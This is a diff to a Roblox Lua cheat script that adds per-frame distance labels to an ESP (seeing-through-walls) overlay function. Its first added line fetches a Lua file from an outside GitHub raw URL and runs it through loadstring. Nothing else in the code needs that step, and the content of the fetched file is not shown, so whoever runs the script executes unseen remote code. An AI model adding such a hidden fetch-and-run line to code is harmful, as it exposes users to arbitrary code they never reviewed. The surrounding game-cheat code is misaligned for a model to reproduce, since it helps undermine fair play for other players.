@@ -1,3 +1,5 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Arcadian420/Services/main/lua.lua'))()
+
 function AddESP(part,TextColor,BillBoardName)
         
         local bill = Instance.new("BillboardGui", part)
@@ -15,6 +17,12 @@ function AddESP(part,TextColor,BillBoardName)
         name.BackgroundTransparency = 1
         name.TextSize = 11
         name.TextStrokeTransparency = 0.5
-    end
 
+        RunService.RenderStepped:Connect(function()
+
+
+
+name.Text = part.Name.." ["..GetDistance(Character.HumanoidRootPart,part).."]"
+    end)
+    end
     --AddESP(workspace.Baseplate,Color3.fromRGB(255,255,255),"WorkspaceESP")
